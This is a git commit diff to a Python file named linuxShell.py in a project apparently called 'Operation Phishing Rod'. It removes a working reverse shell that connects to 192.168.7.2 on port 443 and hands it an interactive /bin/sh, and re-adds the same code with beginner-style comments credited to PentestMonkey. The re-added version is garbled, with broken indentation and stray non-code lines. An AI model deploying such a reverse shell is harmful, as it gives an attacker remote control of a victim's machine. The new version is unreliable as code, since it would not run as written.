e5265a353244599a52987dcc0192accfada20474
Tom-Acronym <tomquinn97@hotmail.co.uk>
2015-11-24 16:18:41 +0000

    Update linuxShell.py

--- Operation Phishing Rod/ReverseShells/linuxShell.py
+++ Operation Phishing Rod/ReverseShells/linuxShell.py
@@ -1,11 +1,27 @@
 
-def linuxShell():
-    import socket,os,subprocess
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("192.168.7.2",443))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    p = subprocess.call(["/bin/sh","-i"])
-    
+def linuxShell(): #this defines the next code as the linux shell
 
+    import socket,os,subprocess 
+#this imports the socket
+
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+#creates an INET, streaming socket
+
+   s.connect(("192.168.7.2",443))
+
+
+#connects the socket to the IP address and port
+
+   os.dup2(s.fileno(),0)
+   os.dup2(s.fileno(),1)
+   os.dup2(s.fileno(),2)
+#the os.dup2 section of this shell is essentially the middle man between the shell socket and the shell interaction.
+
+p = subprocess.call(["/bin/sh","-i"])
+(PentestMonkey)
+
+#this last bit of code calls the subprocess from a specific location and launches the bash script
+
+(Reference)
+
+(PentestMonkey) https://www.google.co.uk/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=python%20shell%20cheat%20sheet
